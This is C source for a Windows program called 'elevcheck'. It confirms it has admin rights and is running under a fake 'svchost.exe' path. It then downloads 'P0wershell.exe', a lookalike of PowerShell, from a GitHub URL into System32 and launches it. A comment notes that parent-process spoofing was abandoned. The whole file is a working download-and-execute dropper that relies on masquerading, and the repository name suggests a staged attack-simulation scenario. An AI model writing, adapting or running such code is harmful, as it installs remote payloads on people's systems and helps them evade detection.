#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <urlmon.h>

BOOL WINAPI IsUserAnAdmin(void);

static void log_msg(const char* msg) {
    FILE* f = fopen("C:\\elevcheck.log", "a");
    if (f) { fprintf(f, "%s\n", msg); fclose(f); }
}

static void press_exit(int code, const char* why) {
    char buf[256];
    snprintf(buf, sizeof(buf), "elevcheck exiting (%d)\n%s", code, why ? why : "");
    log_msg(buf);
    MessageBoxA(NULL, buf, "elevcheck", MB_OK | MB_ICONINFORMATION);
    exit(code);
}

int main(void) {
    DeleteFileA("C:\\elevcheck.log");
    log_msg("[+] elevcheck started");

    if (!IsUserAnAdmin())
        press_exit(1, "[-] Not running as admin.");

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    if (lstrcmpiA(path, "C:\\Program Files\\Microsoft\\svchost.exe") != 0)
        press_exit(1, "[-] Not running from expected path.");

    printf("[+] Running in Elevated Session.\n");

    // download P0wershell.exe
    const char* url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/P0wershell.exe";
    const char* outPath = "C:\\Windows\\System32\\P0wershell.exe";
    printf("[+] Downloading P0wershell.exe...\n");
    HRESULT hr = URLDownloadToFileA(NULL, url, outPath, 0, NULL);
    if (hr != S_OK) {
        printf("[-] Download failed (HRESULT: 0x%lx).\n", hr);
        press_exit(1, "[-] P0wershell.exe download failed.");
    }
    printf("[+] Download complete.\n");
    log_msg("[+] P0wershell.exe download complete");

    // ponytail: launch directly, no PPID spoofing (random-parent OpenProcess was failing)
    STARTUPINFOA si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, (LPSTR)outPath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed (%lu)\n", GetLastError());
        press_exit(1, "[-] CreateProcess of P0wershell.exe failed.");
    }
    printf("[+] P0wershell.exe launched (PID: %lu) — waiting for completion\n", pi.dwProcessId);
    log_msg("[+] P0wershell.exe launched");
    CloseHandle(pi.hThread);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    press_exit(0, "[+] Chain completed.");
}
